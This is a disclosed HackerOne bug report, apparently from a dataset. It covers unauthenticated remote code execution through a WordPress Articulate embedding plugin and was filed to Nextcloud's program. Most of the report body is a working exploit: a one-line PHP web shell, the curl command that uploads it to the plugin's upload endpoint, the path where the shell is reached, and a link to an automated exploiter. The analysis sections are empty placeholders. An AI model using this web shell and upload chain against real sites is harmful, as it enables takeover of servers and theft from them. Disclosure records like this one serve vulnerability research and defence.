---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '696198'
original_report_id: '696198'
title: WordPress Plugin Insert or Embed Articulate Content into WordPress Remote Code
  Execution (UNAUTHORIZED)
weakness: Information Disclosure
team_handle: nextcloud
created_at: '2019-09-17T03:52:56.149Z'
disclosed_at: '2019-11-11T15:23:26.672Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 2
asset_identifier: nextcloud.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# WordPress Plugin Insert or Embed Articulate Content into WordPress Remote Code Execution (UNAUTHORIZED)

## Metadata

- HackerOne Report ID: 696198
- Weakness: Information Disclosure
- Program: nextcloud
- Disclosed At: 2019-11-11T15:23:26.672Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

because in the burp suite, the build request is complicated, I only use curl
1. Create file index.html and index.php

Index.html : 
<html>
Hello world
</html>

Index.php :
<?php
system($_GET[cmd]);
?>

2. Once created enter into .zip (COMPRESS)
3.  LETS UPLOAD
CURL :
curl site.com/index.php/wp-json/articulate/v1/upload-data -F "name={NAMAFILE}" -F "chunk={RANDOM}" -F "chunks={RANDOM}" -F "file=@YOURFILE.zip"
4. OK HERE, THERE IS A READING UPLOAD COMPLETE which means success
we try access to
site.com/PATH/ <PATH = PATH AT RESULT EX: site.com/wp-content/uploads/articulate_uploads/kntl17/index.php

For the autoxploiter https://pastebin.com/BEy5iDLA

## Impact

Remote code execution

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
